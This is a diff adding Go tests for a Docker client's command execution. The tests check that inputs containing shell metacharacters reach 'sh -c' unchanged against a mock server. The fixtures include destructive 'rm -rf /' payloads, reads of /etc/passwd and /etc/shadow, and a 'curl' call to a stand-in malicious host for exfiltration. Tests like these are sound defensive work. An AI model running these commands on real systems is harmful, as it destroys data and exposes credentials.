@@ -25,6 +25,7 @@ import (
 
 	"context"
 	"net/http"
+	"strings"
 )
 
 var _ = Describe("the client", func() {
@@ -315,6 +316,554 @@ var _ = Describe("the client", func() {
 				// Note: Since Execute requires opening up a raw TCP stream to the daemon for the output, this will fail
 				// when using the mock API server. Regardless of the outcome, the log should include the container ID
 				Eventually(logbuf).Should(gbytes.Say(`containerID="?ex-cont-id"?`))
+			})
+		})
+		When(`executing commands with potentially malicious input`, func() {
+			It("should handle commands with shell metacharacters (semicolon)", func() {
+				client := dockerClient{
+					api:           docker,
+					ClientOptions: ClientOptions{},
+				}
+
+				containerID := t.ContainerID("test-container")
+				execID := "exec-id-semicolon"
+				// Command with semicolon that could chain commands
+				cmd := "echo hello; rm -rf /"
+
+				mockServer.AppendHandlers(
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
+						ghttp.VerifyJSONRepresenting(container.ExecOptions{
+							Detach: false,
+							Tty:    true,
+							Cmd:    []string{"sh", "-c", cmd},
+						}),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
+						ghttp.RespondWith(http.StatusOK, nil),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
+							ID:       execID,
+							Running:  false,
+							ExitCode: nil,
+						}),
+					),
+				)
+
+				_, err := client.ExecuteCommand(containerID, cmd, 1)
+				// Test documents current behavior - command is passed through as-is
+				Expect(err).NotTo(HaveOccurred())
+			})
+
+			It("should handle commands with pipe operators", func() {
+				client := dockerClient{
+					api:           docker,
+					ClientOptions: ClientOptions{},
+				}
+
+				containerID := t.ContainerID("test-container")
+				execID := "exec-id-pipe"
+				// Command with pipe that could redirect output
+				cmd := "cat /etc/passwd | grep root"
+
+				mockServer.AppendHandlers(
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
+						ghttp.VerifyJSONRepresenting(container.ExecOptions{
+							Detach: false,
+							Tty:    true,
+							Cmd:    []string{"sh", "-c", cmd},
+						}),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
+						ghttp.RespondWith(http.StatusOK, nil),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
+							ID:       execID,
+							Running:  false,
+							ExitCode: nil,
+						}),
+					),
+				)
+
+				_, err := client.ExecuteCommand(containerID, cmd, 1)
+				Expect(err).NotTo(HaveOccurred())
+			})
+
+			It("should handle commands with logical AND operators", func() {
+				client := dockerClient{
+					api:           docker,
+					ClientOptions: ClientOptions{},
+				}
+
+				containerID := t.ContainerID("test-container")
+				execID := "exec-id-and"
+				// Command with && that chains on success
+				cmd := "true && curl http://malicious.com/exfil"
+
+				mockServer.AppendHandlers(
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
+						ghttp.VerifyJSONRepresenting(container.ExecOptions{
+							Detach: false,
+							Tty:    true,
+							Cmd:    []string{"sh", "-c", cmd},
+						}),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
+						ghttp.RespondWith(http.StatusOK, nil),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
+							ID:       execID,
+							Running:  false,
+							ExitCode: nil,
+						}),
+					),
+				)
+
+				_, err := client.ExecuteCommand(containerID, cmd, 1)
+				Expect(err).NotTo(HaveOccurred())
+			})
+
+			It("should handle commands with logical OR operators", func() {
+				client := dockerClient{
+					api:           docker,
+					ClientOptions: ClientOptions{},
+				}
+
+				containerID := t.ContainerID("test-container")
+				execID := "exec-id-or"
+				// Command with || that chains on failure
+				cmd := "false || echo fallback"
+
+				mockServer.AppendHandlers(
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
+						ghttp.VerifyJSONRepresenting(container.ExecOptions{
+							Detach: false,
+							Tty:    true,
+							Cmd:    []string{"sh", "-c", cmd},
+						}),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
+						ghttp.RespondWith(http.StatusOK, nil),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
+							ID:       execID,
+							Running:  false,
+							ExitCode: nil,
+						}),
+					),
+				)
+
+				_, err := client.ExecuteCommand(containerID, cmd, 1)
+				Expect(err).NotTo(HaveOccurred())
+			})
+
+			It("should handle commands with backticks for command substitution", func() {
+				client := dockerClient{
+					api:           docker,
+					ClientOptions: ClientOptions{},
+				}
+
+				containerID := t.ContainerID("test-container")
+				execID := "exec-id-backtick"
+				// Command with backticks for command substitution
+				cmd := "echo `whoami`"
+
+				mockServer.AppendHandlers(
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
+						ghttp.VerifyJSONRepresenting(container.ExecOptions{
+							Detach: false,
+							Tty:    true,
+							Cmd:    []string{"sh", "-c", cmd},
+						}),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
+						ghttp.RespondWith(http.StatusOK, nil),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
+							ID:       execID,
+							Running:  false,
+							ExitCode: nil,
+						}),
+					),
+				)
+
+				_, err := client.ExecuteCommand(containerID, cmd, 1)
+				Expect(err).NotTo(HaveOccurred())
+			})
+
+			It("should handle commands with $() for command substitution", func() {
+				client := dockerClient{
+					api:           docker,
+					ClientOptions: ClientOptions{},
+				}
+
+				containerID := t.ContainerID("test-container")
+				execID := "exec-id-dollar-paren"
+				// Command with $() for command substitution
+				cmd := "echo $(cat /etc/passwd)"
+
+				mockServer.AppendHandlers(
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
+						ghttp.VerifyJSONRepresenting(container.ExecOptions{
+							Detach: false,
+							Tty:    true,
+							Cmd:    []string{"sh", "-c", cmd},
+						}),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
+						ghttp.RespondWith(http.StatusOK, nil),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
+							ID:       execID,
+							Running:  false,
+							ExitCode: nil,
+						}),
+					),
+				)
+
+				_, err := client.ExecuteCommand(containerID, cmd, 1)
+				Expect(err).NotTo(HaveOccurred())
+			})
+
+			It("should handle commands with path traversal attempts", func() {
+				client := dockerClient{
+					api:           docker,
+					ClientOptions: ClientOptions{},
+				}
+
+				containerID := t.ContainerID("test-container")
+				execID := "exec-id-path-traversal"
+				// Command with path traversal
+				cmd := "cat ../../../../etc/shadow"
+
+				mockServer.AppendHandlers(
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
+						ghttp.VerifyJSONRepresenting(container.ExecOptions{
+							Detach: false,
+							Tty:    true,
+							Cmd:    []string{"sh", "-c", cmd},
+						}),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
+						ghttp.RespondWith(http.StatusOK, nil),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
+							ID:       execID,
+							Running:  false,
+							ExitCode: nil,
+						}),
+					),
+				)
+
+				_, err := client.ExecuteCommand(containerID, cmd, 1)
+				Expect(err).NotTo(HaveOccurred())
+			})
+
+			It("should handle commands with embedded newlines", func() {
+				client := dockerClient{
+					api:           docker,
+					ClientOptions: ClientOptions{},
+				}
+
+				containerID := t.ContainerID("test-container")
+				execID := "exec-id-newline"
+				// Command with newline that could inject additional commands
+				cmd := "echo hello\nrm -rf /"
+
+				mockServer.AppendHandlers(
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
+						ghttp.VerifyJSONRepresenting(container.ExecOptions{
+							Detach: false,
+							Tty:    true,
+							Cmd:    []string{"sh", "-c", cmd},
+						}),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
+						ghttp.RespondWith(http.StatusOK, nil),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
+							ID:       execID,
+							Running:  false,
+							ExitCode: nil,
+						}),
+					),
+				)
+
+				_, err := client.ExecuteCommand(containerID, cmd, 1)
+				Expect(err).NotTo(HaveOccurred())
+			})
+
+			It("should handle very long commands", func() {
+				client := dockerClient{
+					api:           docker,
+					ClientOptions: ClientOptions{},
+				}
+
+				containerID := t.ContainerID("test-container")
+				execID := "exec-id-long"
+				// Very long command (10,000 characters)
+				cmd := strings.Repeat("echo hello; ", 1000)
+
+				mockServer.AppendHandlers(
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
+						ghttp.VerifyJSONRepresenting(container.ExecOptions{
+							Detach: false,
+							Tty:    true,
+							Cmd:    []string{"sh", "-c", cmd},
+						}),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
+						ghttp.RespondWith(http.StatusOK, nil),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
+							ID:       execID,
+							Running:  false,
+							ExitCode: nil,
+						}),
+					),
+				)
+
+				_, err := client.ExecuteCommand(containerID, cmd, 1)
+				Expect(err).NotTo(HaveOccurred())
+			})
+
+			It("should handle commands with null bytes", func() {
+				client := dockerClient{
+					api:           docker,
+					ClientOptions: ClientOptions{},
+				}
+
+				containerID := t.ContainerID("test-container")
+				execID := "exec-id-null"
+				// Command with null byte that could truncate strings
+				cmd := "echo hello\x00rm -rf /"
+
+				mockServer.AppendHandlers(
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
+						ghttp.VerifyJSONRepresenting(container.ExecOptions{
+							Detach: false,
+							Tty:    true,
+							Cmd:    []string{"sh", "-c", cmd},
+						}),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
+						ghttp.RespondWith(http.StatusOK, nil),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
+							ID:       execID,
+							Running:  false,
+							ExitCode: nil,
+						}),
+					),
+				)
+
+				_, err := client.ExecuteCommand(containerID, cmd, 1)
+				Expect(err).NotTo(HaveOccurred())
+			})
+
+			It("should handle commands with output redirection", func() {
+				client := dockerClient{
+					api:           docker,
+					ClientOptions: ClientOptions{},
+				}
+
+				containerID := t.ContainerID("test-container")
+				execID := "exec-id-redirect"
+				// Command with output redirection
+				cmd := "echo secret > /tmp/exfiltrate.txt"
+
+				mockServer.AppendHandlers(
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
+						ghttp.VerifyJSONRepresenting(container.ExecOptions{
+							Detach: false,
+							Tty:    true,
+							Cmd:    []string{"sh", "-c", cmd},
+						}),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
+						ghttp.RespondWith(http.StatusOK, nil),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
+							ID:       execID,
+							Running:  false,
+							ExitCode: nil,
+						}),
+					),
+				)
+
+				_, err := client.ExecuteCommand(containerID, cmd, 1)
+				Expect(err).NotTo(HaveOccurred())
+			})
+
+			It("should handle commands with background execution", func() {
+				client := dockerClient{
+					api:           docker,
+					ClientOptions: ClientOptions{},
+				}
+
+				containerID := t.ContainerID("test-container")
+				execID := "exec-id-background"
+				// Command with background execution
+				cmd := "sleep 1000 &"
+
+				mockServer.AppendHandlers(
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
+						ghttp.VerifyJSONRepresenting(container.ExecOptions{
+							Detach: false,
+							Tty:    true,
+							Cmd:    []string{"sh", "-c", cmd},
+						}),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
+						ghttp.RespondWith(http.StatusOK, nil),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
+							ID:       execID,
+							Running:  false,
+							ExitCode: nil,
+						}),
+					),
+				)
+
+				_, err := client.ExecuteCommand(containerID, cmd, 1)
+				Expect(err).NotTo(HaveOccurred())
+			})
+
+			It("should handle environment variable expansion attempts", func() {
+				client := dockerClient{
+					api:           docker,
+					ClientOptions: ClientOptions{},
+				}
+
+				containerID := t.ContainerID("test-container")
+				execID := "exec-id-env"
+				// Command with environment variable expansion
+				cmd := "echo $PATH; echo $HOME"
+
+				mockServer.AppendHandlers(
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
+						ghttp.VerifyJSONRepresenting(container.ExecOptions{
+							Detach: false,
+							Tty:    true,
+							Cmd:    []string{"sh", "-c", cmd},
+						}),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
+						ghttp.RespondWith(http.StatusOK, nil),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
+							ID:       execID,
+							Running:  false,
+							ExitCode: nil,
+						}),
+					),
+				)
+
+				_, err := client.ExecuteCommand(containerID, cmd, 1)
+				Expect(err).NotTo(HaveOccurred())
+			})
+
+			It("should handle wildcard glob patterns", func() {
+				client := dockerClient{
+					api:           docker,
+					ClientOptions: ClientOptions{},
+				}
+
+				containerID := t.ContainerID("test-container")
+				execID := "exec-id-glob"
+				// Command with glob patterns
+				cmd := "rm -rf /tmp/*"
+
+				mockServer.AppendHandlers(
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
+						ghttp.VerifyJSONRepresenting(container.ExecOptions{
+							Detach: false,
+							Tty:    true,
+							Cmd:    []string{"sh", "-c", cmd},
+						}),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
+						ghttp.RespondWith(http.StatusOK, nil),
+					),
+					ghttp.CombineHandlers(
+						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
+						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
+							ID:       execID,
+							Running:  false,
+							ExitCode: nil,
+						}),
+					),
+				)
+
+				_, err := client.ExecuteCommand(containerID, cmd, 1)
+				Expect(err).NotTo(HaveOccurred())
 			})
 		})
 	})
